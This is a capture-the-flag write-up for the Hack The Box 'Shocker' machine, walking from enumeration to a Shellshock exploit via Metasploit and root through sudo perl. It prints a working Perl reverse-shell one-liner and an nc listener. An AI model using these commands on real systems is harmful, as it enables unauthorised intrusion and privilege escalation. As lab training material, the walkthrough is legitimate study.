# htb-shocker
This is my [Hack the box](https://www.hackthebox.eu/)'s Shocker machine write-up.

## Machine
OS: GNU/Linux

IP: 10.10.10.56

Difficulty: Easy

## Enumeration
[Nmap](https://github.com/nmap/nmap) scan on the target:

`nmap -sV -sC -oN shocker.nmap 10.10.10.56`

Flags:
 - `-sV`: Version detection
 - `-sC`: Script scan using the default set of scripts
 - `-oN`: Output in normal nmap format

```
root@kali:~/htb/shoker# nmap -sV -sC -oN shocker.nmap 10.10.10.56
Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-23 14:54 EDT
Nmap scan report for 10.10.10.56
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds
```
The page itself just has a picture that doesn't really say much. Inspecting the page using dev tools doesn't give any extra information either.

Enumerate directories of the webpage using [gobuster](https://github.com/OJ/gobuster):
```
root@kali:/usr/share/wordlists# gobuster dir --url 10.10.10.56 --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --timeout 20s
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        20s
===============================================================
2020/05/23 15:18:57 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/05/23 15:19:39 Finished
===============================================================
```

Duckduckgoing a bit I noticed that the machine's name refers to the Shell Shock vulnerability (CVE-2014-6271), which is related to the `/cgi-bin` directory.

Search on Metasploit:
```
msf > search shellshock

Matching Modules
================

   Name                                               Disclosure Date  Rank       Description
   ----                                               ---------------  ----       -----------
   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     DHCP Client Bash Environment Variable Code Injection (Shellshock)
   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  IPFire Bash Environment Variable Injection (Shellshock)
   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  CUPS Filter Bash Environment Variable Code Injection (Shellshock)
   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Legend Perl IRC Bot Remote Code Execution
   exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
   exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  Dhclient Bash Environment Variable Injection (Shellshock)
   exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     Qmail SMTP Bash Environment Variable Injection (Shellshock)
```

`multi/http/apache_mod_cgi_bash_env_exec` is the one we were looking for. But this one needs the URI of some script that may be under `/cgi-bin`. 


After several attempts with [wfuzz](https://github.com/xmendez/wfuzz), this one is good for finding `user.sh` was there:

```
root@kali:~# wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  http://10.10.10.56/cgi-bin/FUZZ.sh
```

Now we got the script it's possible to exploit the vulnerability. These are the exploit options already set:
```
   Name            Current Setting                     Required  Description
   ----            ---------------                     --------  -----------
   CMD_MAX_LENGTH  2048                                yes       CMD max line length
   CVE             CVE-2014-6271                       yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent                          yes       HTTP header to use
   METHOD          GET                                 yes       HTTP method to use
   Proxies                                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST           10.10.10.56                         yes       The target address
   RPATH           /bin                                yes       Target PATH for binaries used by the CmdStager
   RPORT           80                                  yes       The target port (TCP)
   SRVHOST         0.0.0.0                             yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT         8080                                yes       The local port to listen on.
   SSL             false                               no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                             no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       http://10.10.10.56/cgi-bin/user.sh  yes       Path to CGI script
   TIMEOUT         5                                   yes       HTTP read response timeout (seconds)
   URIPATH                                             no        The URI to use for this exploit (default is random)
   VHOST                                               no        HTTP server virtual host
```

And it's possible to get a shell by exploiting it:
```
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.4:4444
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (861480 bytes) to 10.10.10.56
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.56:57908) at 2020-05-24 07:35:52 -0400
```

This is enough to get the user flag:
```
whoami
shelly
```

From here it's very straightforward. Check sudoers: `sudo -l`
```
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Good news, `shelly` can run perl as root, so a Perl reverse shell will do:

Attacker:
```
nc -lvp 4444
```

Victim:
```
perl -e 'use Socket;$i="10.10.14.4";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

And that's it:
```
# whoami
root
```
